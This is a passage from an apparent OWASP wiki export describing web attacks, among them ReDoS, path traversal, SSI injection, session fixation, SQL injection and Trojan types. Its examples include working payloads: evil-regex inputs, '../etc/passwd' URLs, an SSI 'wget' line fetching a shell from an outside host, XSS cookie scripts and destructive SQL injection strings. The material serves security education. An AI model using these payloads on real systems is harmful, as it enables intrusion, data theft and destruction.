1. [http://regexlib.com/REDetails.aspx?regexp_id=1757 ReGexLib,id=1757 (email validation)] - see bold part, which is an '''Evil Regex'''
 ^([a-zA-Z0-9])'''(([\-.]|[_]+)?([a-zA-Z0-9]+))*'''(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$
 
Input:
 aaaaaaaaaaaaaaaaaaaaaaaa!

2. [[OWASP Validation Regex Repository]], Java Classname - see bold part, which is an '''Evil Regex'''
 ^'''(([a-z])+.)+'''[A-Z]([a-z])+$
 
Input:
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

===Web application attack===
* Open a JavaScript 
* Find '''Evil Regex'''
* Craft a malicious input for the found Regex
* Submit a valid value via intercepting proxy 
* Change the request to contain a malicious input
* You are done!

===ReDoS via Regex Injection===
The following example checks if the username is part of the password entered by the user.
 String userName = textBox1.Text;
 String password = textBox2.Text;
 Regex testPassword = new Regex(userName);
 Match match = testPassword.Match(password);
 if (match.Success)
 {
     MessageBox.Show("Do not include name in password.");
 }
 else
 {
     MessageBox.Show("Good password.");
 }
If an attacker enters ''^(([a-z])+.)+[A-Z]([a-z])+$'' as a username and ''aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'' as a password, the program will hang.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Relative Path Traversal</name>
    <description>This attack is a variant of Path Traversal and can be exploited when the application accepts the use of relative traversal sequences such as "../".

</description>
    <environment />
    <example>The following URLs are vulnerable to this attack:

 &lt;nowiki&gt; http://some_site.com.br/get-files.jsp?file=report.pdf  &lt;/nowiki&gt;
 &lt;nowiki&gt; http://some_site.com.br/get-page.php?home=aaa.html  &lt;/nowiki&gt;
 &lt;nowiki&gt; http://some_site.com.br/some-page.asp?page=index.html  &lt;/nowiki&gt;

A simple way to execute this attack is like this:

 &lt;nowiki&gt; http://some_site.com.br/get-files?file=../../../../some dir/some file  &lt;/nowiki&gt;
 &lt;nowiki&gt; http://some_site.com.br/../../../../etc/shadow  &lt;/nowiki&gt;
 &lt;nowiki&gt; http://some_site.com.br/get-files?file=../../../../etc/passwd &lt;/nowiki&gt;
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Repudiation Attack</name>
    <description>A repudiation attack happens when an application or system does not adopt controls to properly track and log users' actions, thus permitting malicious manipulation or forging the identification of new actions.
This attack can be used to change the authoring information of actions executed by a malicious user in order to log wrong data to log files. Its usage can be extended to general data manipulation in the name of others, in a similar manner as spoofing mail messages.
If this attack takes place, the data stored on log files can be considered invalid or misleading.
</description>
    <environment />
    <example>Consider a web application that makes access control and authorization based on ''JSESSIONID'', but registers user actions based on a ''user'' parameter defined on the Cookie header, as follows:

  POST &lt;nowiki&gt;http://someserver/Upload_file.jsp&lt;/nowiki&gt; HTTP/1.1
  Host: tequila:8443
  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4
  Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
  Accept-Language: en-us,en;q=0.5
  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
  Keep-Alive: 300
  Connection: keep-alive
  Referer: &lt;nowiki&gt;http://someserver/uploads.jsp&lt;/nowiki&gt;
  '''Cookie: JSESSIONID=EE3BD1E764CD6EED280426128201131C; user=leonardo'''
  Content-Type: multipart/form-data; boundary=---------------------------263152394310685
  Content-Length: 321

And the log file is composed by:

 Date, Time, Source IP, Source port, Request, User

Once user information is acquired from user parameter on HTTP header, a malicious user could make use of a local proxy (eg:paros) and change it by a known or unknown username.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Resource Injection</name>
    <description>This attack consists of changing resource identifiers used by an application in order to perform a malicious task. When an application permits a user input to define a resource, like a file name or port number, this data can be manipulated to execute or access different resources.
&lt;br&gt;
In order to be properly executed, the attacker must have the possibility to specify a resource identifier through the  application form and the application must permit its execution.

The resource type affected by user input indicates the content type that may be exposed. For example, an application that permits input of special characters like period, slash, and backslash is risky when used in methods that interact with the file system.

The resource injection attack focuses on accessing other resources than the local filesystem, which is different attack technique known as a [[Path Manipulation]] attack.&lt;br&gt;</description>
    <environment />
    <example>===Example 1===
The following examples represent an application which gets a port number from an HTTP request and creates a socket with this port number without any validation. A user using a proxy can modify this port and obtain a direct connection (socket) with the server.
&lt;br&gt;&lt;br&gt;

'''Java code:'''

 String rPort = request.getParameter("remotePort");
 ...
 ServerSocket srvr = new ServerSocket(rPort);
 Socket skt = srvr.accept(); 
 ...

&lt;br&gt;
'''.Net code:'''

 int rPort = Int32.Parse(Request.get_Item("remotePort "));
 ...
 IPEndPoint endpoint = new IPEndPoint(address,rPort);
 socket = new Socket(endpoint.AddressFamily, 
 SocketType.Stream, ProtocolType.Tcp);
 socket.Connect(endpoint);
 ...

===Example 2===
This example is same as previous, but it gets port number from CGI requests using C++:

 char* rPort = getenv("remotePort ");
 ...
 serv_addr.sin_port = htons(atoi(rPort));
 if (connect(sockfd,&amp;serv_addr,sizeof(serv_addr)) &lt; 0) 
 error("ERROR connecting");
 ...

===Example 3===
This example in PLSQL / TSQL gets a URL path from a CGI and downloads the file contained in it. If a user modifies the path or filename, it’s possible to download arbitrary files from server:
 ...
 filename := SUBSTR(OWA_UTIL.get_cgi_env('PATH_INFO'), 2);
 WPG_DOCLOAD.download_file(filename); 
 ...</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Server-Side Includes (SSI) Injection</name>
    <description>SSIs are directives present on Web applications used to feed an HTML page with dynamic contents. They are similar to CGIs, except that SSIs are used to execute some actions before the current page is loaded or while the page is being visualized. In order to do so, the web server analyzes SSI before supplying the page to the user. 

The Server-Side Includes attack allows the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary codes remotely. It can be exploited through manipulation of SSI in use in the application or force its use through user input fields. 

It is possible to check if the application is properly validating input fields data by inserting characters that are used in SSI directives, like:

 &lt; ! # = / . " - &gt; and [a-zA-Z0-9] 

Another way to discover if the application is vulnerable is to verify the presence of pages with extension .stm, .shtm and .shtml. However, the lack of these type of pages does not mean that the application is protected against SSI attacks.

In any case, the attack will be successful only if the web server permits SSI execution without proper validation. This can lead to access and manipulation of file system and process under the permission of the web server process owner.

The attacker can access sensitive information, such as password files, and execute shell commands. The SSI directives are injected in input fields and they are sent to the web server. The web server parses and executes the directives before supplying the page. Then, the attack result will be viewable the next time that the page is loaded for the user's browser.
</description>
    <environment />
    <example>=== Example 1===

The commands used to inject SSI vary according to the server operational system in use.  The following commands represent the syntax that should be used to execute OS commands. 

'''Linux:'''

List files of directory:

 &lt;!--#exec cmd="ls" --&gt;

Access directories:

 &lt;!--#exec cmd="cd /root/dir/"&gt;

Execution script:
 
 &lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;

'''Windows:'''

List files of directory:

 &lt;!--#exec cmd="dir" --&gt;

Access directories:
 
 &lt;!--#exec cmd="cd C:\admin\dir"&gt;

===Example 2===

Other SSI examples that can be used to access and set server information:

To change the error message output:
 
 &lt;nowiki&gt;&lt;!--#config errmsg="File not found, informs users and password"--&gt;&lt;/nowiki&gt;

To show current document filename:
 
 &lt;nowiki&gt;&lt;!--#echo var="DOCUMENT_NAME" --&gt;&lt;/nowiki&gt;

To show virtual path and filename:
 
 &lt;nowiki&gt;&lt;!--#echo var="DOCUMENT_URI" --&gt;&lt;/nowiki&gt;

Using the “config” command and “timefmt” parameter, it is possible to control the date and time output format:
 
 &lt;nowiki&gt;&lt;!--#config timefmt="A %B %d %Y %r"--&gt;&lt;/nowiki&gt;

Using the “fsize” command, it is possible to print the size of selected file:
 
 &lt;nowiki&gt;&lt;!--#fsize file="ssi.shtml" --&gt;&lt;/nowiki&gt;

===Example 3===

An old vulnerability in the IIS versions 4.0 and 5.0 allows an attacker to obtain system privileges through a buffer overflow failure in a dynamic link library (ssinc.dll). The “ssinc.dll” is used to interpreter process Server-Side Includes. 
[http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0506 CVE 2001-0506].

By creating a malicious page containing the SSI code bellow and forcing the application to load this page ([[Path Traversal]] attack), it’s possible to perform this attack: 

ssi_over.shtml

 &lt;nowiki&gt;&lt;!--#include file=”UUUUUUUU...UU”--&gt;&lt;/nowiki&gt;

PS: The number of “U” needs to be longer than 2049.
 
Forcing application to load the ssi_over.shtml page:

Non-malicious URL:

 &lt;nowiki&gt;www.vulnerablesite.org/index.asp?page=news.asp&lt;/nowiki&gt;

Malicious URL:
 &lt;nowiki&gt;www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml&lt;/nowiki&gt;

If the IIS return a blank page it indicates that an overflow has occurred. In this case, the attacker might manipulate the procedure flow and executes arbitrary code.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Session fixation</name>
    <description>Session Fixation is an attack that permits an attacker to hijack a valid user session. The attack explores a limitation in the way the web application manages the session ID, more specifically the vulnerable web application. When authenticating a user, it doesn’t assign a new session ID, making it possible to use an existent session ID. The attack consists of obtaining a valid session ID (e.g. by connecting to the application), inducing a user to authenticate himself with that session ID, and then hijacking the user-validated session by the knowledge of the used session ID. The attacker has to provide a legitimate Web application session ID and try to make the victim's browser use it.

The session fixation attack is a class of [[Session hijacking attack|Session Hijacking]], which steals the established session between the client and the Web Server after the user logs in. Instead, the Session Fixation attack fixes an established session on the victim's browser, so the attack starts before the user logs in. 

There are several techniques to execute the attack; it depends on how the Web application deals with session tokens. Below are some of the most common techniques:

'''• Session token in the URL argument:'''
The Session ID is sent to the victim in a hyperlink and the victim accesses the site through the malicious URL.

'''• Session token in a hidden form field:'''
In this method, the victim must be tricked to authenticate in the target Web Server, using a login form developed for the attacker. The form could be hosted in the evil web server or directly in html formatted e-mail.

'''• Session ID in a cookie:'''

o Client-side script

Most browsers support the execution of client-side scripting. In this case, the aggressor could use attacks of code injection as the [[Cross-site Scripting (XSS)|XSS]] (Cross-site scripting) attack to insert a malicious code in the hyperlink sent to the victim and fix a Session ID in its cookie. Using the function document.cookie, the browser which executes the command becomes capable of fixing values inside of the cookie that it will use to keep a session between the client and the Web Application.
 
o &lt;META&gt; tag

&lt;META&gt; tag also is considered a code injection attack, however, different from the XSS attack where undesirable scripts can be disabled, or the execution can be denied. The attack using this method becomes much more efficient because it's impossible to disable the processing of these tags in the browsers.

o HTTP header response

This method explores the server response to fix the Session ID in the victim's browser. Including the parameter Set-Cookie in the HTTP header response, the attacker is able to insert the value of Session ID in the cookie and sends it to the victim's browser.</description>
    <environment />
    <example>===Example 1===
The example below explains a simple form, the process of the attack, and the expected results.

(1)The attacker has to establish a legitimate connection with the web server which (2) issues a session ID or, the attacker can create a new session with the proposed session ID, then, (3) the attacker has to send a link with the established session ID to the victim, she has to click on the link sent from the attacker accessing the site, (4) the Web Server saw that session was already established and a new one need not to be created, (5) the victim provides his credentials to the Web Server, (6) knowing the session ID, the attacker can access the user's account.

&lt;center&gt;

https://www.owasp.org/images/9/9c/Fixation.jpg

Figure 1. Simple example of Session Fixation attack.
&lt;/center&gt;

===Example 2===
Client-side scripting

The processes for the attack using the execution of scripts in the victim's browser are very similar to example 1, however, in this case, the Session ID does not appear as an argument of the URL, but inside of the cookie. To fix the value of the Session ID in the victim's cookie, the attacker could insert a JavaScript code in the URL that will be executed in the victim's browser.

 &lt;nowiki&gt; http://website.kom/&lt;script&gt;document.cookie=”sessionid=abcd”;&lt;/script&gt;&lt;/nowiki&gt;

===Example 3===
&lt;META&gt; tag

As well as client-side scripting, the code injection must be made in the URL that will be sent to the victim.

 &lt;nowiki&gt;http://website.kon/&lt;meta http-equiv=Set-Cookie content=”sessionid=abcd”&gt;&lt;/nowiki&gt;

===Example 4===
HTTP header response

The insertion of the value of the SessionID into the cookie manipulating the server response can be made, intercepting the packages exchanged between the client and the Web Application inserting the Set-Cookie parameter.

&lt;center&gt;

https://www.owasp.org/images/e/ed/Fixation2.jpg

Figure 2. Set-Cookie in the HTTP header response
&lt;/center&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Session hijacking attack</name>
    <description>The Session Hijacking attack consists of the exploitation of the web session control mechanism, which is normally managed for a session token. 

Because http communication uses many different TCP connections, the web server needs a method to recognize every user’s connections. The most useful method depends on a token that the Web Server sends to the client browser after a successful client authentication. A session token is normally composed of a string of variable width and it could be used in different ways, like in the URL, in the header of the http requisition as a cookie, in other parts of the header of the http request, or yet in the body of the http requisition.

The Session Hijacking attack compromises the session token by stealing or predicting a valid session token to gain unauthorized access to the Web Server.

The session token could be compromised in different ways; the most common are:
* Predictable session token;
* Session Sniffing;
* Client-side attacks (XSS, malicious JavaScript Codes, Trojans, etc);
* [[Man-in-the-middle attack]]
* [[Man-in-the-browser attack]]</description>
    <environment />
    <example>===Example 1===
====Session Sniffing====

In the example, as we can see, first the attacker uses a sniffer to capture a valid token session called “Session ID”, then he uses the valid token session to gain unauthorized access to the Web Server. 


&lt;center&gt;
[[Image:Session_Hijacking_3.JPG]] 

Figure 2. Manipulating the token session executing the session hijacking attack.
&lt;/center&gt;

===Example 2===
====Cross-site script attack====

The attacker can compromise the session token by using malicious code or programs running at the client-side. The example shows how the attacker could use an XSS attack to steal the session token. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.
The example in figure 3 uses an XSS attack to show the cookie value of the current session; using the same technique it's possible to create a specific JavaScript code that will send the cookie to the attacker.

&lt;SCRIPT&gt;alert(document.cookie);&lt;/SCRIPT&gt;


&lt;center&gt;
[[Image:Code_Injection.JPG]] 

Figure 3. Code injection.
&lt;/center&gt;


'''Other Examples'''
The following attacks intercept the information exchange between the client and the server:
* [[Man-in-the-middle attack]]
* [[Man-in-the-browser attack]]
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Session Prediction</name>
    <description>The session prediction attack focuses on predicting session ID values that permit an attacker to bypass the authentication schema of an application. By analyzing and understanding the session ID generation process, an attacker can predict a valid session ID value and get access to the application. 

In the first step, the attacker needs to collect some valid session ID values that are used to identify authenticated users. Then, he must understand the structure of session ID, the information that is used to create it, and the encryption or hash algorithm used by application to protect it.
Some bad implementations use sessions IDs composed by username or other predictable information, like timestamp or client IP address. In the worst case, this information is used in clear text or coded using some weak algorithm like base64 encoding.

In addition, the attacker can implement a brute force technique to generate and test different values of session ID until he successfully gets access to the application.</description>
    <environment />
    <example>The session ID information for a certain application is normally composed by a string of fixed width. Randomness is very important to avoid its prediction. 
Looking at the example in Figure 1, the session ID variable is represented by JSESSIONID and its value is “user01”, which corresponds to the username. By trying new values for it, like “user02”, it could be possible to get inside the application without prior authentication. 

&lt;center&gt;
[[Image:Predictable_cookie.JPG]]

Figure 1. Predictable cookie
&lt;/center&gt;
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Setting Manipulation</name>
    <description>This attack aims to modify application settings in order to cause misleading data or advantages on the attacker's behalf. He may manipulate values in the system and manage specific user resources of the application or affect its functionalities.

An attacker can exploit several functionalities of the application using this attack technique, but it would not possible to describe all the ways of exploration, due to innumerable options that attacker may use to control the system values.   

Using this attack technique, it is possible to manipulate settings by changing the application functions, such as calls to the database, blocking access to external libraries, and/or modification log files.</description>
    <environment />
    <example>===Example 1 ===

An attacker needs to identify the variables without input validation or those improperly encapsulated to obtain success in the attack.

The following example was based on those found in the Individual CWE Dictionary Definition (Setting Manipulation-15). 

Consider the following piece of Java code:
  …
  conn.setCatalog(request.getParameter(“catalog”));
  ...

This fragment reads the string “catalog” from “HttpServletRequest” and sets it as the active catalog for a database connection. An attacker could manipulate this information and cause a connection error or unauthorized access to other catalogs.

===Example 2 – Block Access to Libraries ===

The attacker has the privileges to block application access to external libraries to execute this attack. It is necessary to discover what external libraries are accessed by the application and block them. The attacker needs to observe if the behavior of the system goes into an insecure/inconsistent state.

In this case the application uses a third party cryptographic random number generation library to generate user Session IDs. An attacker may block access to this library by renaming it.
Then the application will use the weak pseudo random number generation library. The attacker can use this weakness to predict the Session ID user; he/she attempts to perform elevation of privilege escalation and gains access to the user's account. 

For more details about this attack, see:
http://capec.mitre.org/data/definitions/96.html
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Special Element Injection</name>
    <description>Special Element Injection is a type of injection attack that exploits a weakness related to reserved words and special characters.

Every programming language and operating system has special characters considered as reserved words for it. However, when an application receives such data as user input, it is possible to observe unexpected behavior in the application when parsing this information. This can lead to information disclosure, access control and authorization bypass, code injection, and many other variants.

According to the characters used, the Special Element Injection attack can be performed using macro symbols, parameter delimiter and null characters/null bytes, among others.</description>
    <environment />
    <example>=== Example 1 - Macro symbol ===

The Special Element Injection attack based on macro symbols can be performed by inserting macro symbols in input fields or user configuration files. A known example of this attack can be represented by vulnerability exploitation on Quake II server 3.20 and 3.21. This vulnerability allows a remote user to access server console variables (cvar), directory lists, and execute admin commands by a client on the Quake II Server. 

On this application, cvars are used by the client and server to store configuration and status information. A cvar can be accessed by “$name” syntax, where “name” is the name of the console variable to be expanded. 

However, it is possible to modify the client console to send a malicious command to the server, such as “say $rcon_password” to attempt to discover the content server $rcon_password variables.

By discovering the password, it is possible to perform further actions on the server, like discovering directory structures, command execution, and visualization of file contents.

=== Example 2 - Parameter delimiter ===

Parameter Delimiter is another variant of Special Element Injection. The example below illustrates how this attack can be performed using a vulnerability found on PHP posting system Poster version.two.  

This application has a dangerous vulnerability that allows data insertion into fields (username, password, email address and privileges) of the “mem.php” file. This file is responsible for managing application users.

An example of “mem.php” file is shown bellow, where user Jose has admin privileges and Alice has just user access:

 &lt;?
 Jose|12345678|jose@attack.com|admin|
 Alice|87654321|alice@attack.com|normal|
 ?&gt;

When a user wants to edit his profile, he must use edit account” option in the “index.php” page and enter his login information. However, using “|” as a parameter delimiter on email field followed by “admin” profile, the user could elevate her privileges to administrator. Example:
 Username: Alice
 Password: 87654321
 Email: alice@attack.com |admin| 

This information will be recorded in “mem.php” file like this: 

 Alice|87654321|alice@attack.com|admin|normal|

The next time user Alice logs in, the application will acquire the parameter “|admin|” as user profile, thus elevating her privileges to administrator profile.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Spyware</name>
    <description>Spyware is a program that captures statistical information from a user's computer and sends it over internet without user acceptance. This information is usually obtained from cookies and the web browser’s history. Spyware can also install other software, display advertisements, or redirect the web browser activity.
Spyware differs from a virus, worm, and adware in various ways. Spyware does not self-replicate and distribute itself like viruses and worms, and does not necessarily display advertisements like adware. The common characteristics between spyware and viruses, worms, and adware are:
# exploitation of the infected computer for commercial purposes
# the display, in some cases, of advertisements</description>
    <environment />
    <example>&lt;center&gt;

https://www.owasp.org/images/6/68/Figura2.jpg

Figure 1. A lot of toolbars added by spyware, and some working as spyware
&lt;/center&gt;
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>SQL Injection</name>
    <description>A [[SQL injection]] attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. 
SQL injection attacks are a type of  [[Top 10 2007-Injection Flaws | injection attack]], in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.

* SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. 
* SQL Injection is very common with PHP and ASP applications due to the prevalence of older functional interfaces. Due to the nature of programmatic interfaces available, J2EE and ASP.NET applications are less likely to have easily exploited SQL injections. 
* The severity of SQL Injection attacks is limited by the attacker’s skill and imagination, and to a lesser extent, defense in depth countermeasures, such as low privilege connections to the database server and so on. In general, consider SQL Injection a high impact severity.

SQL injection errors occur when:

# Data enters a program from an untrusted source. 
# The data used to dynamically construct a SQL query 

The main consequences are:

* '''Confidentiality''': Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with [[Glossary#SQL Injection|SQL Injection]] vulnerabilities.

* '''Authentication''': If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.

* '''Authorization''': If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a [[Glossary#SQL Injection|SQL Injection]] vulnerability.

* '''Integrity''': Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a [[Glossary#SQL Injection|SQL Injection]] attack.</description>
    <environment />
    <example>===Example 1===

In SQL:

&lt;pre&gt;
select id, firstname, lastname from authors
&lt;/pre&gt;

If one provided:

&lt;pre&gt;
Firstname: evil'ex
Lastname: Newman
&lt;/pre&gt;

the query string becomes:

&lt;pre&gt;
select id, firstname, lastname from authors where forename = 'evil'ex' and surname ='newman'
&lt;/pre&gt;

which the database attempts to run as:

&lt;pre&gt;
Incorrect syntax near il' as the database tried to execute evil. 
&lt;/pre&gt;

A safe version of the above SQL statement could be coded in Java as:

&lt;pre&gt;
String firstname = req.getParameter("firstname");
String lastname = req.getParameter("lastname");
// FIXME: do your own validation to detect attacks
String query = "SELECT id, firstname, lastname FROM authors WHERE forename = ? and surname = ?";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, firstname );
pstmt.setString( 2, lastname );
try
{
	ResultSet results = pstmt.execute( );
}
&lt;/pre&gt;

===Example 2===

The following C# code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.

&lt;pre&gt;
	...
	string userName = ctx.getAuthenticatedUserName();
	string query = "SELECT * FROM items WHERE owner = "'" 
					+ userName + "' AND itemname = '"  
					+ ItemName.Text + "'";
	sda = new SqlDataAdapter(query, conn);
	DataTable dt = new DataTable();
	sda.Fill(dt);
	...
&lt;/pre&gt;

The query that this code intends to execute follows:

&lt;pre&gt;
	SELECT * FROM items
	WHERE owner = 
	AND itemname = ;
&lt;/pre&gt;

However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string "name' OR 'a'='a" for itemName, then the query becomes the following:

&lt;pre&gt;
	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name' OR 'a'='a';
&lt;/pre&gt;

The addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:

&lt;pre&gt;
	SELECT * FROM items;
&lt;/pre&gt;

This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.

===Example 3===

This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name hacker enters the string "name'); DELETE FROM items; --" for itemName, then the query becomes the following two queries:

&lt;pre&gt;
	SELECT * FROM items 
	WHERE owner = 'hacker'
	AND itemname = 'name';

	DELETE FROM items;

	--'
&lt;/pre&gt;

Many database servers, including Microsoft® SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error in Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, in databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.

Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. In a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a", the following three valid statements will be created:

&lt;pre&gt;
	SELECT * FROM items 
	WHERE owner = 'hacker'
	AND itemname = 'name';

	DELETE FROM items;

	SELECT * FROM items WHERE 'a'='a';
&lt;/pre&gt;

One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:

* Target fields that are not quoted 
* Find ways to bypass the need for certain escaped meta-characters 
* Use stored procedures to hide the injected meta-characters 

Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.

Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.

&lt;pre&gt;
	procedure get_item (
		itm_cv IN OUT ItmCurTyp,
		usr in varchar2,
		itm in varchar2)
	is
		open itm_cv for ' SELECT * FROM items WHERE ' ||
				'owner = '''|| usr || 
				' AND itemname = ''' || itm || '''';
	end get_item;
&lt;/pre&gt;

Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</example>
    <determination>===How to Avoid SQL Injection Vulnerabilities===

See the OWASP [[SQL Injection Prevention Cheat Sheet]].&lt;br&gt;
See the OWASP [[Query Parameterization Cheat Sheet]].&lt;br&gt;
See the [[:Category:OWASP Guide Project|OWASP Guide]] article on how to [[Guide to SQL Injection | Avoid SQL Injection]] Vulnerabilities.&lt;br&gt;

===How to Review Code for SQL Injection Vulnerabilities===

See the [[:Category:OWASP Code Review Project|OWASP Code Review Guide]] article on how to [[Reviewing Code for SQL Injection|Review Code for SQL Injection]] Vulnerabilities.

===How to Test for SQL Injection Vulnerabilities===

See the [[:Category:OWASP Testing Project|OWASP Testing Guide]] article on how to [[Testing_for_SQL_Injection_(OTG-INPVAL-005)|Test for SQL Injection]] Vulnerabilities.
</determination>
    <protection />
  </vul>
  <vul>
    <name>Traffic flood</name>
    <description>Traffic Flood is a type of [[Denial of Service|DoS]] attack targeting web servers. The attack explores the way that the TCP connection is managed. The attack consists of the generation of a lot of well-crafted TCP requisitions, with the objective to stop the Web Server or cause a performance decrease.

The attack explores a characteristic of the HTTP protocol, opening many connections at the same time to attend a single requisition.  This special feature of the http protocol, which consists of opening a TCP connection for every html object and closing it, could be used to make two different kinds of exploitations. 
The Connect attack is done during the establishment of the connection, and the Closing attack is done during the connection closing.</description>
    <environment />
    <example>===Connect attack===
This type of attack consists of establishing a big number of fake TCP connections with an incomplete HTTP request until the web server is overwhelmed with connections and stops responding.

The aim of the incomplete HTTP request is to keep the web server, with the TCP connection in Established state, waiting for the completion of the request, as shown in figure 1. Depending on the implementation of the web server, the connection stays in this state until there is a  timeout of the TCP connection or of the web server. In this way it’s possible to establish a great number of new connections before the first ones begin to timeout. Moreover, the generation rate of new connections grows faster than the expiring ones.  

&lt;center&gt;

https://www.owasp.org/images/b/b4/Trafficatual.jpg

&lt;/center&gt;
The attack could also affect a firewall that implements a proxy like access control as Checkpoint FW1.

===Closing Attack===
The Closing Attack is done during the ending steps of a TCP connection, exploring how some web servers deal with the finalization of the TCP connection especially with the FIN_WAIT_1 state.
The attack, as explained by Stanislav Shalunov, "comes in two flavors: mbufs exhaustion and process saturation."

When doing mbufs exhaustion, one wants the user-level process on the other end to write the data without blocking and closing the descriptor. The kernel will have to deal with all the data, and the user-level process will be free, so that more requests can be sent this way and eventually consume all the mbufs or all physical memory, if mbufs are allocated dynamically.

When doing process saturation, one wants user-level process to block while trying to write data. The architecture of many HTTP servers will allow serving only a certain number of connections at a time. When this number of connections  is reached, the server will stop responding to legitimate users. If the server doesn't put a bound on the number of connections, resources will still be tied up and eventually the machine comes to a crawling halt.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Trojan Horse</name>
    <description>A Trojan Horse is a program that uses malicious code masqueraded as a trusted application. The malicious code can be injected on benign applications, masqueraded in e-mail links, or sometimes hidden in JavaScript  pages to make furtive attacks against vulnerable internet Browsers.

Other details can be found in [[Man-in-the-browser attack]].

===The 7 Main Types of Trojan Horse===
# '''Remote Access Trojan (RAT):''' Designed to provide the attacker full control of the infected machine. Trojan horse usually masqueraded as a utility. 
# '''Data Sending Trojan:''' Trojan horse that uses keylogger technology to capture sensitive data like passwords, credit card and banking information, and IM messages, and sends them back to the attacker.
# '''Destructive Trojan:''' Trojan horse designed to destroy data stored on the victim’s computer.
# '''Proxy Trojan:''' Trojan horse that uses the victim's computer as a proxy server, providing the attacker an opportunity to execute illicit acts from the infected computer, like banking fraud, and even malicious attacks over the internet.
# '''FTP Trojan:''' This type of Trojan horse uses the port 21 to enable the attackers to connect to the victim's computer using File Transfer Protocol.
# '''Security software disabler Trojan:''' This Trojan horse is designed to disable security software like firewall and antivirus, enabling the attacker to use many invasion techniques to invade the victim's computer, and even to infect more than the computer.
# '''Denial-of-Service attack Trojan:''' Trojan horse designed to give the attacker opportunity to realize Denial-of-Service attacks from victim's computer.

===Symptoms===

Some common symptoms:

* Wallpaper and other background settings auto-changing
* Mouse pointer disappears
* Programs auto-loading and unloading
* Strange window warnings, messages and question boxes, and options being displayed constantly
* e-mail client auto sending messages to all on the user's contacts list
* Windows auto closing
* System auto rebooting
* Internet account information changing
* High internet bandwidth being used without user action
* Computer's high resources consumption (computer slows down)
* Ctrl + Alt + Del stops working
</description>
    <environment />
    <example>An iframe pointing to a javascript which downloads malware: http://isc.sans.org/diary.html?storyid=2923&amp;dshield=4c501ba0d99f5168ce114d3a3feab567
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Unicode Encoding</name>
    <description>The attack aims to explore flaws in the decoding mechanism implemented on applications when decoding Unicode data format. An attacker can use this technique to encode certain characters in the URL to bypass application filters, thus accessing restricted resources on the Web server or to force browsing to protected pages.</description>
    <environment />
